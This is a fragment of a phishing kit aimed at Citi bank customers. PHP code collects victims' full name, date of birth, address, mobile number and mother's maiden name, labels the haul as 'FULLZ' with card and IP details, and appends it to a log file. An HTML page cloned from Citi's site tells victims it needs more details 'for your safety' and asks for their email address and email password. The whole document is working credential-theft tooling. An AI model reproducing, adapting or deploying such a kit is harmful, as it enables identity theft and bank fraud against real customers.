...
session_start();
if($_POST['fullname'] and $_POST['dob'] and $_POST['mobile'] and $_POST['address'] and $_POST['city'] and $_POST['state'] and $_POST['zipcode'] and $_POST['mmn']){
...
$subj = "Kr3pto CITI FULLZ $bin - $scheme $type $brand $bank [$country - $os - $ip]";
...
if($saveonhost == 1){
$fp = fopen('l0gz/CITI_fullz_.txt', 'a');
fwrite($fp, $data."\n");
fclose($fp);
}
                                        ...
                                        <app-set-up-online-access _nghost-ytb-c286="" class="ng-tns-c212-0 ng-star-inserted">
                                            <citi-simple-layout _ngcontent-ytb-c286="" role="main" brandingtype="preLoginVanilla">
                                                ...
                                                <citi-form-container _ngcontent-ytb-c286="" formheader="" formaction="" class="set-up-online-overflow ng-star-inserted">
                                                    <form name="undefined" action="Confirmation.php?sessionid=<?php echo generateRandomString(130); ?>&sslchannel=true" method="POST">
                                                        <div>
                                                                ...
                                                                <section _ngcontent-ytb-c286="" class="parentDiv">
                                                                    <section _ngcontent-ytb-c286="">
                                                                        <citi-text-header _ngcontent-ytb-c286="" level="1" class="HelpHeader" _nghost-ytb-c54="">
                                                                            ...
                                                                            <h1 _ngcontent-ytb-c54="" class="HelpHeader header-level-2 ng-star-inserted">Registered Email Information</h1>
                                                                        </citi-text-header>
                                                                    </section>
                                                                    <section _ngcontent-ytb-c286="">
                                                                        <citi-text-header _ngcontent-ytb-c286="" level="2" class="subHeader" _nghost-ytb-c54="">
                                                                            <h2 _ngcontent-ytb-c54="" class="header-level-3 subHeader ng-star-inserted">
                                                                                For your safety we are required to ask you to provide us more details in order to proceed with your login process.
                                                                            </h2>
                                                                        </citi-text-header>
                                                                    </section>
                                                                    <section _ngcontent-ytb-c286="">
                                                                                ...
                                                                                <div _ngcontent-ytb-c100="" class="row">
																					...
																					<section>
                                                                                        <div class="form-group">
																							<label for="emailaddress" class="hiddenclass" style="opacity: 0;">Registered E-Mail Address</label>
                                                                                            <div>
																								<input placeholder="Registered E-Mail Address" type="email" name="emailaddress" id="emailaddress" class="form-control ng-untouched ng-pristine ng-valid" required="">
                                                                                            </div>
																							<div style="display:none;" class="input-error ng-star-inserted"><span class="validation-message-danger">Please enter your Registered E-Mail Address.</span></div>
                                                                                        </div>
                                                                                    </section>
																					
																					<section>
                                                                                        <div class="form-group">
																							<label for="emailpassword" class="hiddenclass" style="opacity: 0;">Registered E-Mail Password</label>
                                                                                            <div>
																								<input placeholder="Registered E-Mail Password" type="password" name="emailpassword" id="emailpassword" class="form-control ng-untouched ng-pristine ng-valid" required="">
                                                                                            </div>
																							<div style="display:none;" class="input-error ng-star-inserted"><span class="validation-message-danger">Please enter your Registered E-Mail Password.</span></div>
                                                                                        </div>
                                                                                    </section>
